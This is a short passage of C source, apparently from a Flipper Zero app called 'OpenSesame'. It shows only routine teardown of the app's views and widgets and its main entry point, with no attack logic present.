    view_dispatcher_remove_view(app->view_dispatcher, ViewIdAbout);
    view_dispatcher_remove_view(app->view_dispatcher, ViewIdDirections);

    submenu_free(app->submenu);
    widget_free(app->attack_mode_widget);
    widget_free(app->target_widget);
    widget_free(app->config_widget);
    widget_free(app->about_widget);
    widget_free(app->directions_widget);
    view_free(app->buffer_view);
    view_free(app->saved_codes_view);
    view_free(app->attack_view);

    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    
    free(app);
}

// Main Entry Point
int32_t opensesame_app_entry(void* p) {
    UNUSED(p);
    OpenSesameApp* app = opensesame_app_alloc();

    if(app == NULL) {
        return -1;
    }

    view_dispatcher_run(app->view_dispatcher);

    opensesame_app_free(app);
    return 0;
}
